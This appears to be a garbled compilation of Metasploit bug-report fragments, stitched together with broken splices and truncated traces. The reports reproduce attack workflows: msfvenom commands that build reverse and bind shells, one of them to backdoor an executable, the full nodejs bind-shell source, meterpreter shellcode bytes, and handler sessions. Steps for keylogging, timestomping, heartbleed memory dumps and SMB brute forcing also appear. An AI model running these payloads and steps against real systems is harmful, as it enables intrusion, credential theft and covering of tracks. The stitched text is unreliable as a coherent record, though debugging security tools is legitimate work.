i, [2017-10-17t10:43:54.810587 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.810634 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.810681 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.810738 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.810785 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.810833 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.810879 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.810936 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.810985 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.811032 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.811094 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.811143 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.811190 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.811238 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.811308 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.811355 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.811405 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.811453 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
segmentation fault
``` rsions.
launch exploit in metasploit: $use exploit/windows/browser/ms16_051_vbscript
with the victim computer with ie 11 installed, browse the target url
metasploit shows "sending main page" in the console
nothing happens on the client side: with the vbscript console (through the inspector) an error pops 'cette variable utilise un type automation non g par vbscript: 'bl.a' rsions.
: - ### creating the payload
root@kali:~/framework/msf/metasploit-framework# ./msfvenom -p nodejs/shell_bind_tcp lhost=192.168.43.224 lport=3000 > /root/desktop/node_payload.js
no platform was selected, choosing msf::module::platform::nodejs from the payload
no arch selected, selecting arch: nodejs from the payload
no encoder or badchars specified, outputting raw payload
payload size: 583 bytes
``` ### setting up the listener ```
msf > use multi/handler
msf exploit(handler) > set payload nodejs/shell_bind_tcp
payload => nodejs/shell_bind_tcp
msf exploit(handler) > set lhost 192.168.43.224
lhost => 192.168.43.224
msf exploit(handler) > set lport 3000
lport => 3000
msf exploit(handler) > exploit
[*] exploit running as background job 0
[*] started bind handler
### executing the payload
root@kali:~/desktop# node node_payload.js
/root/desktop/node_payload.js:1
(function (exports, require, module, __filename, __dirname) { (function(){ var require = global.require || global.process.mainmodule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh"; var net = require("net"), cp = require("child_process"), util = require("util"); var server = net.createserver(function(socket) { var sh = cp.spawn(cmd, []); socket.pipe(sh.stdin); if (typeof util.pump === "undefined") { sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); } else { util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); } }); server.listen(3000); })(); referenceerror: client is not defined at server.<anonymous> (/root/desktop/node_payload.js:1:484) at emitone (events.js:96:13) at server.emit (events.js:188:7) at tcp.onconnection (net.js:1454:8)
### checking the listener
msf exploit(handler) > exploit
[*] exploit running as background job 0
[*] started bind handler
msf exploit(handler) > [*] command shell session 1 opened (127.0.0.1:34929 -> 127.0.0.1:3000) at 2017-10-11 01:19:53 +0530
[*] 127.0.0.1 - command shell session 1 closed
reason: died from eoferror ```
exploit rsions.
trigger travis builds with a commit and docker-compose job failed with a timeout
details:
when using the windows/smb/smb_relay exploit in combination with a x64 payload like windows/x64/meterpreter/reverse_tcp, the payload delivery does not work
no session is created
the reason seems to be that the service which is created via smb to execute the payload is marked as interactive service
this is disabled by default on newer versions of windows
windows logs the following message to the system log:
"the dioamqbpibv service is marked as an interactive service
however, the system is configured to not allow interactive services
this service may not function properly." this issue only appears when using x64 payloads
if you use an x86 payload, everything works as expected
tested against windows 10, 1511 as the target system
i also tried removing the service_interactive_process flag as suggested in this issue but it did not change the behaviour:
run check against a vulnerable host with `struts.ognl.allowstaticmethodaccess=false` (this might be the default)
note that the module reports the host as not vulnerable, even though it is.
first, creating the backdoor with msfvenom outside of metasploit
root@5433584:~# msfvenom -p php/meterpreter_reverse_tcp lhost=10.14.11.92 lport=4449 -f raw > shell5.php
no platform was selected, choosing msf::module::platform::php from the payload
no arch selected, selecting arch: php from the payload
no encoder or badchars specified, outputting raw payload
payload size: 30067 bytes
starting the listener
msf > use multi/handler
msf exploit(handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 10.14.11.92
lhost => 10.14.11.92
msf exploit(handler) > set lport 4449
lport => 4449
msf exploit(handler) > show options module options (exploit/multi/handler): name current setting required description ---- --------------- -------- ----------- payload options (php/meterpreter/reverse_tcp): name current setting required description ---- --------------- -------- ----------- lhost 10.14.11.92 yes the listen address lport 4449 yes the listen port exploit target: id name -- ---- 0 wildcard target msf exploit(handler) > exploit
[*] exploit running as background job 0
[*] started reverse tcp handler on 10.14.11.92:4449
netstat -an |grep 444 shows: root@5433584:~# netstat -an |grep 444
tcp 0 0 10.14.11.92:4449 0.0.0.0:* listen
therefore, everythings is fine
calling the php script directly in browser to trigger:
rsions.
install a no-upgrades ubuntu 12.04 or other heartbleed vulnerable system
inside msfconsole
use auxiliary/scanner/ssl/openssl_heartbleed
set rhosts ip-of-vulnerable-host
set action dump
exploit i have been using this exact example with my students for quite a while and it just stopped working with recent updates.
firing commands using the auxiliary/scanner/winrm/winrm_cmd fails with an http 500
![image]( confirmed winrm is working correctly using the following commands via meterpreter powershell extension: ![image]( (yes, routing is setup properly)
victim host is windows 10
target is windows server 2012 r2
both ntlm & kerberos auth options confirmed open
wireshark on the victim is revealing interesting data
properly working request (from invoke-command): ![image]( failing request (winrm_cmd): ![image]( seems as though the second response of ntlm negotiation is being truncated by metasploit, but not positive
## system stuff
i used msfvenom to generate the payloads.
got a meterpreter callback using metasploit exploit handler
i tried doing a `uictl disable keyboard`
it worked as expected then i tried doing a `uictl enable keyboard`
it worked as expected but when i tried doing again
the command isn't working and the victim's keyboard still works.
`uictl disable keyboard` i am running both the machines on vmware v12.1.0 build-3272444 .the victim machine has a windows 7 sp1.
get meterpreter callback using metasploit exploit handler
add route through session.
select exploit/windows/misc/ibm_websphere_java_deserialize.
ensure ssl is enabled
throw exploit at host2 through host1
watch traffic in wireshark on host1/2
same behavior seen with exploit/windows/http/octopusdeploy_deploy.
run exploit on unix probably would be problem for windows too using normal exploit command
press `ctrl + z` to try to background.
create a payload using one of the new meterpreter_reverse_http(s) payloads for either linux or osx using the appropriate architecture and place it on a target machine.
start the appropriate handler in msf.
fire off the payload on the target machine to start a meterpreter session.
interact with the session in msf.
type "shell".
when attempting to import a scan using db_import, i get the following error:
``` db_import '/home/emily/downloads/acunetix scans/project23 \ egoth.xml' \
[*] importing 'acunetix' data
[*] import: parsing with 'nokogiri v1.8.0'
[*] importing host xxx.xx.xxx.xx
[*] importing service xxx.xx.xxx.xx:80 [*] importing service xxx.xx.xxx.xx:53
[*] importing service xxx.xx.xxx.xx:53
[*] importing service xxx.xx.xxx.xx:21
[-] error while running command db_import: pg::undefinedcolumn: error: column web_vulns.category does not exist
line 1: ...lns"."name" = $5 and "web_vulns"."query" = $6 and "web_vulns..
hint: perhaps you meant to reference the column "web_vulns.category_id".
: select "web_vulns".* from "web_vulns" where "web_vulns"."web_site_id" = $1 and "web_vulns"."path" = $2 and "web_vulns"."method" = $3 and "web_vulns"."pname" = $4 and "web_vulns"."name" = $5 and "web_vulns"."query" = $6 and "web_vulns"."category" = \'imported\' order by "web_vulns"."id" asc limit 1 call stack:
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/activerecord-4.2.9/lib/active_record/connection_adapters/postgresql_adapter.rb:637:in `prepare'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/activerecord-4.2.9/lib/active_record/connection_adapters/postgresql_adapter.rb:637:in `prepare_statement'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/activerecord-4.2.9/lib/active_record/connection_adapters/postgresql_adapter.rb:596:in `exec_cache'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/activerecord-4.2.9/lib/active_record/connection_adapters/postgresql_adapter.rb:585:in `execute_and_clear'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/activerecord-4.2.9/lib/active_record/connection_adapters/postgresql/database_statements.rb:160:in `exec_query'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/activerecord-4.2.9/lib/active_record/connection_adapters/abstract/database_statements.rb:356:in `select'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/activerecord-4.2.9/lib/active_record/connection_adapters/abstract/database_statements.rb:32:in `select_all'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/activerecord-4.2.9/lib/active_record/connection_adapters/abstract/query_cache.rb:70:in `select_all'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/activerecord-4.2.9/lib/active_record/querying.rb:39:in `find_by_sql'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/activerecord-4.2.9/lib/active_record/relation.rb:639:in `exec_queries'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/activerecord-4.2.9/lib/active_record/relation.rb:515:in `load'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/activerecord-4.2.9/lib/active_record/relation.rb:243:in `to_a'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/activerecord-4.2.9/lib/active_record/relation/finder_methods.rb:500:in `find_nth_with_limit'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/activerecord-4.2.9/lib/active_record/relation/finder_methods.rb:484:in `find_nth'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/activerecord-4.2.9/lib/active_record/relation/finder_methods.rb:127:in `first'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/activerecord-4.2.9/lib/active_record/relation.rb:163:in `first_or_initialize'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.15.4/lib/msf/core/db_manager/web.rb:353:in `block in report_web_vuln'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/activerecord-4.2.9/lib/active_record/connection_adapters/abstract/connection_pool.rb:292:in `with_connection'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.15.4/lib/msf/core/db_manager/web.rb:291:in `report_web_vuln'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.15.4/lib/rex/parser/nokogiri_doc_mixin.rb:153:in `db_report'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.15.4/lib/rex/parser/acunetix_nokogiri.rb:388:in `report_web_vuln'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.15.4/lib/rex/parser/acunetix_nokogiri.rb:114:in `end_element'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/nokogiri-1.8.0/lib/nokogiri/xml/sax/document.rb:127:in `end_element_namespace'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/nokogiri-1.8.0/lib/nokogiri/xml/sax/parser.rb:110:in `parse_with'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/nokogiri-1.8.0/lib/nokogiri/xml/sax/parser.rb:110:in `parse_memory'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/nokogiri-1.8.0/lib/nokogiri/xml/sax/parser.rb:83:in `parse'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.15.4/lib/msf/core/db_manager/import/acunetix.rb:11:in `import_acunetix_noko_stream'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.15.4/lib/msf/core/db_manager/import/acunetix.rb:24:in `import_acunetix_xml'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.15.4/lib/msf/core/db_manager/import.rb:95:in `import'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.15.4/lib/msf/core/db_manager/import.rb:151:in `import_file'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.15.4/lib/msf/ui/console/command_dispatcher/db.rb:1388:in `block (3 levels) in cmd_db_import'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.15.4/lib/msf/ui/console/command_dispatcher/db.rb:1381:in `each'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.15.4/lib/msf/ui/console/command_dispatcher/db.rb:1381:in `block (2 levels) in cmd_db_import'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.15.4/lib/msf/ui/console/command_dispatcher/db.rb:1375:in `each'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.15.4/lib/msf/ui/console/command_dispatcher/db.rb:1375:in `block in cmd_db_import'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/activerecord-4.2.9/lib/active_record/connection_adapters/abstract/connection_pool.rb:292:in `with_connection'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.15.4/lib/msf/ui/console/command_dispatcher/db.rb:1370:in `cmd_db_import'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.15.4/lib/rex/ui/text/dispatcher_shell.rb:430:in `run_command'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.15.4/lib/rex/ui/text/dispatcher_shell.rb:392:in `block in run_single'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.15.4/lib/rex/ui/text/dispatcher_shell.rb:386:in `each'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.15.4/lib/rex/ui/text/dispatcher_shell.rb:386:in `run_single'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.15.4/lib/rex/ui/text/shell.rb:205:in `run'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.15.4/lib/metasploit/framework/command/console.rb:48:in `start'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.15.4/lib/metasploit/framework/command/base.rb:82:in `start'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.15.4/msfconsole:48:in `<top (required)>'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/bin/msfconsole:23:in `load'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/bin/msfconsole:23:in `<main>'
``` ## system stuff
os: kali linux
version: kali gnu/linux rolling \ \\l
msf > version\
framework: 4.15.4-dev
console : 4.15.4-dev
installed with [ ] commercial/community installer (from after the latest upgrade and dist-upgrade something funky was happening when running msfconsole
i ended up uninstalling metasploit all together so i could reinstall and hopefully fix the problem
installing it from the command line using apt-get install, however, kept giving me an error when trying to start metasploit from the command line
i googled the error and came across an answer which messed things up a bit more
so after some fiddling and troubleshooting i tried installing it again, this time using the installer provided on rapid7
everything was successful and i was able to start the framework from the command line without error and without error when running msfconsole.
prior to this update, the db_import command was working just fine so something must of gone awry during this whole process
or it might have nothing to do with it
i'm too novice to understand the log output, so any help is appreciated
thanks in advance!
this happen every time i open msfconsole
i have the correct repositories and the sistem is update rsions.
`msfvenom` produces the stage1 shellcode (the stager) as i'd expect:
msfvenom -p windows/meterpreter/reverse_tcp lhost=127.0.0.1 lport=4444 -f python
no platform was selected, choosing msf::module::platform::windows from the payload
no arch selected, selecting arch: x86 from the payload
no encoder or badchars specified, outputting raw payload
payload size: 333 bytes
final size of python file: 1602 bytes
buf += "\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b"
[..skipped...]
``` `msfconsole` on the other hand obliterates shell history by writing the stage2 shellcode (the stage) to the console as well: ```
msfconsole -q -x 'use payload/windows/meterpreter/reverse_tcp; set lhost 127.0.0.1; set lport 4444; generate -t python; exit'
# windows/meterpreter/reverse_tcp - 281 bytes (stage 1)
#
# verbose=false, lhost=127.0.0.1, lport=4444, # reverseallowproxy=false, reverseconnectretries=5, # reverselistenerthreaded=false, payloaduuidtracking=false, # enablestageencoding=false, stageencodersaveregisters=, # stageencodingfallback=true, prependmigrate=false, # exitfunc=process, autoloadstdapi=true, # autoverifysession=true, autoverifysessiontimeout=30, # initialautorunscript=, autorunscript=, autosysteminfo=true, # enableunicodeencoding=false, sessionretrytotal=3600, # sessionretrywait=10, sessionexpirationtimeout=604800, # sessioncommunicationtimeout=300
buf += "\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b"
[..skipped additional stage1...] # windows/meterpreter/reverse_tcp - 956991 bytes (stage 2)
#
buf += "\\x4d\\x5a\\xe8\\x00\\x00\\x00\\x00\\x5b\\x52\\x45\\x55\\x89\\xe5"
buf += "\\x81\\xc3\\xff\\x17\\x00\\x00\\xff\\xd3\\x81\\xc3\\xfa\\x7d\\x0e"
buf += "\\x00\\x89\\x3b\\x53\\x6a\\x04\\x50\\xff\\xd0\\x00\\x00\\x00\\x00"
buf += "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
[...skipped some 73,000 lines of output...]
i don't see an option to only generate the first stage, either:
jeff@blue:~$ msfconsole -q -x 'use payload/windows/meterpreter/reverse_tcp; show advanced; exit' module advanced options (payload/windows/meterpreter/reverse_tcp): name current setting required description ---- --------------- -------- ----------- autoloadstdapi true yes automatically load the stdapi extension autorunscript no a script to run automatically on session creation
autosysteminfo true yes automatically capture system information on initialization
autoverifysession true yes automatically verify and drop invalid sessions autoverifysessiontimeout 30 no timeout period to wait for session validation to occur, in seconds enablestageencoding false no encode the second stage payload enableunicodeencoding false yes automatically encode utf-8 strings as hexadecimal handlersslcert no path to a ssl certificate in unified pem format, ignored for http transports initialautorunscript no an initial script to run on session creation (before autorunscript) payloaduuidname no a human-friendly name to reference this unique payload (requires tracking) payloaduuidraw no a hex string representing the raw 8-byte puid value for the uuid payloaduuidseed no a string to use when generating the payload uuid (deterministic) payloaduuidtracking false yes whether or not to automatically register generated uuids prependmigrate false yes spawns and runs shellcode in new process prependmigrateproc no process to spawn and run shellcode in reverseallowproxy false yes allow reverse tcp even with proxies specified
connect back will not go through proxy but directly to lhost reverseconnectretries 5 yes the number of connection attempts to try before exiting the process reverselistenerbindaddress no the specific ip address to bind to on the local system reverselistenerbindport no the port to bind to on the local system if different from lport reverselistenercomm no the specific communication channel to use for this listener reverselistenerthreaded false yes handle every connection in a new thread (experimental) sessioncommunicationtimeout 300 no the number of seconds of no activity before this session should be killed sessionexpirationtimeout 604800 no the number of seconds before this session should be forcibly shut down sessionretrytotal 3600 no number of seconds try reconnecting for on network failure sessionretrywait 10 no number of seconds to wait between reconnect attempts stageencoder no encoder to use if enablestageencoding is set stageencodersaveregisters no additional registers to preserve in the staged payload if enablestageencoding is set stageencodingfallback true no fallback to no encoding if the selected stageencoder is not compatible verbose false no enable detailed status messages workspace no specify the workspace for this module
spin up an windows server in azure, create an active directory and assign it to a virtual network.
spin up another windows server, add it to the virtual network and join it to the domain
create a kali box in azure, join it to the virtual network.
try psexec at the second windows server
tried against windows server 2016 and server 2008 r2, both failed
impacket-psexec works.
launch multi_console_command.rb multi console command is not working and printing help.
you provided the correction here but i open this issue to help other finding it until it's fixes ;) thanks ;)
starting nginx 1.4.0 running the nginx_chunked_size exploit via metasploit rsions.
on the module jboss_vulnscan, there is an option to set a different http verb to try to bypass the jboss authentication
if you set a different http verb to try the authentication bypass, the print_status still showing the default option (head), instead of showing the current configured one.
open msfconsole 2
and search something
![image]( rsions.
1) meterpreter with system priviledges on session 2 2) use post/windows/capture/lockout_keylogger 3) set session 2 4) exploit
i did timestomp to a windows 7 32 bit file located in "c:\\" from a reverse_http meterpreter
before i've loaded the priv and also do getsystem.
i ran several timestomp command
timestomp text.txt -c "[dates]"
timestomp text.txt -b
timestomp text.txt -v timestomp result error as following:
error running command timestomp: nomethoderror undefined method 'match' for nil:nilclass did you mean? catch
no error, but didn't blank the mace
no error (mace didn't change)
![timestomp_issue]( note: timestomp -f didn't work either
![timestomp_issue 2](
* [x] `use auxiliary/scanner/http/enum_wayback`
* [x] `set domain rapid7.com`
* [x] `run` ## example output ```
[*] pulling urls from archive.org
[*] located 19 addresses for rapid7.com
http:// all audio
http:// all image
http:// all software
http:// all texts
http:// all video
http:// this just in
src=" " alt="wayback machine"/>
src=" ">
in</span>
[*] auxiliary module execution completed
``` ## api the module should probably use an api
here's a couple of example apis which may be useful
* hxxp://web.archive.org/web/timemap/link/
* hxxp://web.archive.org/cdx/search/cdx?url=example.com&output=json documentation: *
the auxiliary/scanner/smb/smb_login module throws a rubysmb error when used
this works perfect on my previous version of kali linux until i installed a new version and updated metasploit
issue: using the auxiliary/scanner/smb/smb_login module, the scanner comes up with a rubysmb error that reads: [*] error: 192.168.20.203 rubysmb::error::netbiossessionservice nbss header is missing expected behavior: the usual / expected output reads:
[+] 192.168.20.203:445 - smb - success: 'test\\administrator:password' - administrator the output in .msf4/logs/framework.log is:
[06/07/2017 07:49:28] [e(0)] core: error running against host 192.168.20.203: nbss header is missing
usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/ruby_smb-0.0.17/lib/ruby_smb/dispatcher/socket.rb:49:in `recv_packet'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/ruby_smb-0.0.17/lib/ruby_smb/client.rb:229:in `send_recv'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/ruby_smb-0.0.17/lib/ruby_smb/client/authentication.rb:264:in `smb2_ntlmssp_authenticate'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/ruby_smb-0.0.17/lib/ruby_smb/client/authentication.rb:191:in `smb2_authenticate'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/ruby_smb-0.0.17/lib/ruby_smb/client/authentication.rb:19:in `authenticate'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/ruby_smb-0.0.17/lib/ruby_smb/client.rb:187:in `login'
/usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/smb.rb:101:in `attempt_login'
/usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/smb.rb:72:in `attempt_bogus_login'
/usr/share/metasploit-framework/modules/auxiliary/scanner/smb/smb_login.rb:84:in `run_host'
/usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run'
/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn' system details include:
- currently using metasploit framework version 4.14.23-dev on kali linux version '4.9.0-kali3-amd64 #1 smp debian 4.9.18-1kali1 (2017-04-04) x86_64'
- installed this and updated a day ago
the ruby version is ruby 2.3.3p222 (2016-11-21) [x86_64-linux-gnu] i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version)
import xml from external nmap ping scan (nmap -sn x.x.x.x)
run db_nmap using the -sn switch for ping scan
there are no errors shown in either situation nmap version: 7.40 rsions.
i am trying to create a reverse shell payload `msfvenom -p windows/shell_reverse_tcp lhost=10.0.0.50 lport=4444 -f hex` to backdoor an existing pe
victim os: vista home premium sp 1
gain a linux meterpreter shell on a x86/x64 bit linux box
took a meterpreter session on linux box using msfvenom - elf type payload.
used meterpreter to run the gnome_keyring_dump module.
create a file with a password with non-ascii characters; for example create the file abbe.lst with the single password abb (this word appears in the file /usr/share/wordlists/metasploit/password.lst on the current version of kali, which is how i found the issue) ```
msf auxiliary(smb_login) > show options module options (auxiliary/scanner/smb/smb_login): name current setting required description ---- --------------- -------- ----------- abort_on_lockout false yes abort the run when an account lockout is detected blank_passwords false no try blank passwords for all users bruteforce_speed 5 yes how fast to bruteforce, from 0 to 5 db_all_creds false no try each user/password couple stored in the current database db_all_pass false no add all passwords in the current database to the list db_all_users false no add all users in the current database to the list detect_any_auth true no enable detection of systems accepting any authentication pass_file /usr/share/wordlists/metasploit/abbe.lst no file containing passwords, one per line preserve_domains true no respect a username that contains a domain name
proxies no a proxy chain of format type:host:port[,type:host:port][...] record_guest false no record guest-privileged random logins to the database rhosts 10.0.15.200 yes the target address range or cidr identifier rport 445 yes the smb service port (tcp) smbdomain pluto no the windows domain to use for authentication smbpass no the password for the specified username smbuser jbach no the username to authenticate as stop_on_success false yes stop guessing when a credential works for a host threads 1 yes the number of concurrent threads userpass_file no file containing users and passwords separated by space, one pair per line user_as_pass false no try the username as the password for all users user_file no file containing usernames, one per line verbose true yes whether to print output for all attempts msf auxiliary(smb_login) > run [*] 10.0.15.200:445 - smb - starting smb login bruteforce
[*] 10.0.15.200:445 - this system does not accept authentication with any credentials, proceeding with brute force
[-] auxiliary failed: nomethoderror undefined method `disconnect!' for nil:nilclass
[-] call stack:
[-] /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/smb.rb:136:in `ensure in attempt_login'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/smb.rb:136:in `attempt_login'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:231:in `block in scan!'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:154:in `block in each_credential'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/credential_collection.rb:132:in `block in each'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/credential_collection.rb:130:in `each_line'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/credential_collection.rb:130:in `each'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:141:in `each_credential'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:205:in `scan!'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/smb/smb_login.rb:113:in `run_host'
[-] /usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run'
[-] /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
[*] auxiliary module execution completed
running the command with loglevel 5 yields the following data from /root/.msf4/logs/framework.log ```
[05/20/2017 16:05:19] [e(0)] core: thread exception: scannerhost(scanner/smb/smb_login)-10.0.15.200 critical=false error: nomethoderror undefined method `disconnect!' for nil:nilclass source: /usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:129:in `block in run' /usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:116:in `loop' /usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:116:in `run' /usr/share/metasploit-framework/lib/msf/base/simple/auxiliary.rb:140:in `job_run_proc' /usr/share/metasploit-framework/lib/msf/base/simple/auxiliary.rb:82:in `run_simple' /usr/share/metasploit-framework/lib/msf/base/simple/auxiliary.rb:92:in `run_simple' /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/auxiliary.rb:104:in `cmd_run' /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:430:in `run_command' /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:392:in `block in run_single' /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:386:in `each' /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:386:in `run_single' /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:205:in `run' /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start' /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start' /usr/bin/msfconsole:48:in `<main>'
[05/20/2017 16:05:19] [e(0)] core: call stack
/usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/smb.rb:136:in `ensure in attempt_login'
/usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/smb.rb:136:in `attempt_login'
/usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:231:in `block in scan!'
/usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:154:in `block in each_credential'
/usr/share/metasploit-framework/lib/metasploit/framework/credential_collection.rb:132:in `block in each'
/usr/share/metasploit-framework/lib/metasploit/framework/credential_collection.rb:130:in `each_line'
/usr/share/metasploit-framework/lib/metasploit/framework/credential_collection.rb:130:in `each'
/usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:141:in `each_credential'
/usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:205:in `scan!'
/usr/share/metasploit-framework/modules/auxiliary/scanner/smb/smb_login.rb:113:in `run_host'
